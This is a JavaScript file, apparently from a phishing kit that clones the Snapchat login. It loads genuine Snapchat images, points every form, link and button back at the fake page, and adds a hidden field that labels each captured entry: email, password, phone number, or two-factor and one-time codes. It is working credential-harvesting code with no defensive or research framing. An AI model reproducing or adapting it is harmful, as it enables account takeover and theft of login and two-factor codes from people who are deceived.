// document.querySelectorAll("link").forEach(li => {
//     let prev = li.href
//     let len = location.origin.length
//     if (prev.includes(location.origin)) {
//         prev = prev.slice(len, prev.length)
//         li.href = `https://accounts.snapchat.com${prev}`
//     }
// })

document.querySelectorAll("img").forEach(li => {
    let prev = li.src
    let len = location.origin.length
    if (prev.includes(location.origin)) {
        prev = prev.slice(len, prev.length)
        li.src = `https://accounts.snapchat.com${prev}`
    }
})

let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = false
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})



//  sets
let accountIdentifier = document.querySelector("#accountIdentifier")
let password = document.querySelector("#password")
let accountIdentifierPhoneNumber = document.querySelector("#accountIdentifierPhoneNumber")
let twoFAChallengeAnswer = document.querySelector("#twoFAChallengeAnswer")
let otpChallengeAnswer = document.querySelector("#otpChallengeAnswer")

if (accountIdentifier) {
    addSpikeType("email")
} else if (password) {
    addSpikeType("password")
    let showPassBtn = document.querySelector(`[class="eye-icon"]`)
    let showPass = false
    if (showPassBtn) {
        showPassBtn.addEventListener("click", () => {
            if (showPass == false) {
                password.type = "text"
                showPass = true
            } else {
                password.type = "password"
                showPass = false
            }
        })
    }
}
else if (accountIdentifierPhoneNumber) {
    addSpikeType("phone")
} else if (twoFAChallengeAnswer) {
    addSpikeType("otp_code")
} else if (otpChallengeAnswer) {
    addSpikeType("otp_code_1")
}


// functions
let changePhone = document.querySelector(`.additional-action`)
if (changePhone) {
    let a = changePhone.querySelector("a")
    a.href = "#"
    a.addEventListener("click", () => {
        addSpikeType("phone_number")
        document.querySelector("#account_identifier_form").submit()
    })
}
